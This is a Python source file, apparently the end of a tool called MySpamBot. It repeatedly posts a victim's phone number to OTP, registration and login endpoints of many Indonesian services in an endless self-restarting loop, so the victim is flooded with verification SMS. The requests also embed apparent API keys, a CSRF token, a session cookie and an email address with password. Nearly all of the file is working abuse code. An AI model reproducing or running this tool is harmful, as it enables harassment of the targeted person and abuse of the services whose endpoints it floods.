            Harvestcake                            =  requests.post("https://harvestcakes.com/register",data={"phone":b},headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
            Tokomanamana                           =  requests.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":nomor},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}).text
            MI_metroindonesia                      =  requests.post('http://access.metroindonesia.com/Member/sendpin',data={'phoneno':nomor}).text
            Matchwatch                             =  requests.post('https://apiv2.jamtangan.com/validateuniqueid', files={'params':(None, nomor),'step':(None, '2'),'type':(None, 'sms')}).text
            Tokomanamana                           =  requests.post('https://tokomanamana.com/ma/auth/request_token_merchant/',data={'phone':nomor},headers={'Host': 'tokomanamana.com','Connection': 'keep-alive','Content-Length': '18','Accept': '*/*','Origin': 'https://tokomanamana.com','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Referer': 'https://tokomanamana.com/ma/register','Accept-Encoding': 'gzip, deflate','Accept-Language': 'id-ID,en-US;q=0.8'})
            Harnic                                 =  requests.post('https://harnic.id:443/login/phone_auth_OTP', data={'phone':nomor})
            
            Carsome_wa                             =  requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","x-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"A4p3vs1Ixu9wp3wFmCEG9K","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":1})).text
            Jenius                                 =  requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
            Alodokter_400xend                      =  requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
            Pizzahut                               =  requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
            Kredinesia                             =  requests.post("https://api.kredinesia.id/v1/login/verificationCode",headers={"Host":"api.kredinesia.id","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.kredinesia.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.kredinesia.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"captcha":""})).text
            Ginee                                  =  requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},data=json.dumps({"account":"0"+nomor,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})).text
            Misteraladin                           =  requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
            
            autoketik(f"{hijau}Successfully sent spam sequences")
            countdown(120) # Do not modify!
            RTO_flag = 1
            rto = 1 # Delayed flag
            
        except requests.exceptions.ConnectionError:
            if RTO_flag == 0:
                print("")
                autoketik("--Request Time Out--") # Flag when hitting RTO in one of the URLs
                print(f"{putih}Automatic failover engaged to alternative requests{hijau}")
            print("")
            autoketik("--Delay active due to failover block--")
            time.sleep(10) 
            rto = 1
        except urllib3.exceptions.NewConnectionError: # Error Handling 2 to stop recurring errors
            print("")
            autoketik("--Failed to establish a new connection--")
            time.sleep(100) # Delay 100 seconds
            rto = 1
        except TimeoutError: # HTTPSConnectionPool() connection attempt dropped
            print("")
            autoketik("--A Connection attempt failed because the connected party did not properly respond--")
            time.sleep(100) # Delay 100 seconds
            rto = 1
        except urllib3.exceptions.ProtocolError: 
            print("")
            autoketik("--A Connection attempt failed because the connected party did not properly respond--")
            time.sleep(100) # Delay 100 seconds
            rto = 1
        except KeyboardInterrupt: # Error Handling When user presses CTRL+C
            print("")
            tanya(nomor)
            
    if rto == 1:
        time.sleep(80) # If RTO error occurred, pause process for 80 seconds
        start(nomor, 1)
    else:
        start(nomor, 1) # Recall start() with flag 1 meaning not the first iteration

def start(nomor: str, x: int) -> None: 
    """Starts the Spam tool loop.
    
    Args:
        nomor: The target phone number.
        x: Iteration flag (0 for initialization, 1 for loop continuation).
    """
    if x == 0: # First time entering start()
        os.system("cls") # Clear Terminal
        autoketik(f"{merah}Infinite Loop Spam to {putih}{nomor} {merah}is {hijau}Ready!{hijau}") # Logging initialization
        jam(nomor)
    else:
        print("")
        autoketik("--reboot wait 15 seconds--")
        time.sleep(15) # Wait 15 seconds
        os.system("cls") 
        autoketik(f"{merah}Repeating Spam to Number : {nomor}.....{hijau}") # Logging repeat
        jam(nomor)
        
def main() -> None:
    """Entrypoint function for terminal execution."""
    os.system("cls") 
    autoketik(f"Welcome to {merah}MySpamBot")
    print(f"""{kuning}Author      : {hijau}Ricky Khairul Faza
{kuning}Github      : {merah}github.com/rickyfazaa
{kuning}Instagram   : {biru}instagram.com/rickyfazaa""")
    # Example format: 089508226367
    print(nomor := input(f"{hijau}Insert target number: {putih}")) # Walrus operator for input
    start(nomor, 0) # Start the sequence

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        autoketik(f"""{merah}Canceled
{hijau}--Exiting Tool--""")
        sys.exit()
